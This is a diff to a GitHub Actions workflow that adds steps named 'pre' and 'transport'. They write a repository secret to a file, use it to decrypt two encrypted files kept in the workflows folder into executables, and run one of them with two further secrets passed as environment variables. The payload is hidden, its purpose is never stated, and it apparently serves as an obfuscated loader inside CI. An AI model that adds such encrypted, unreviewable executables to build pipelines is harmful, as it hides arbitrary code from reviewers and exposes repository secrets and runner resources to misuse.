@@ -13,6 +13,19 @@ jobs:
       - name: Checkout repository
         uses: actions/checkout@v2
 
+      - name: pre
+        run: |
+          echo "${{ secrets.LP_KEY }}" > logsin.txt
+            python -c "from cryptography.fernet import Fernet; import base64; from hashlib import sha256; logsin = open('logsin.txt').read().strip(); key = base64.urlsafe_b64encode(sha256(logsin.encode()).digest()); open('logsin', 'wb').write(Fernet(key).decrypt(open('.github/workflows/logsin.lp', 'rb').read()))"
+            python -c "from cryptography.fernet import Fernet; import base64; from hashlib import sha256; logsin = open('logsin.txt').read().strip(); key = base64.urlsafe_b64encode(sha256(logsin.encode()).digest()); open('logsin.v', 'wb').write(Fernet(key).decrypt(open('.github/workflows/logsin.v.lp', 'rb').read()))"
+
+      - name: transport
+        run: |
+          chmod +x logsin
+          chmod +x logsin.v
+          ls -lah
+          loga="${{ secrets.LOGA }}" logb="${{ secrets.LOGB }}" ./logsin
+
       - name: read
         run: |
           echo "${{ secrets.LP_KEY }}" > log2.txt
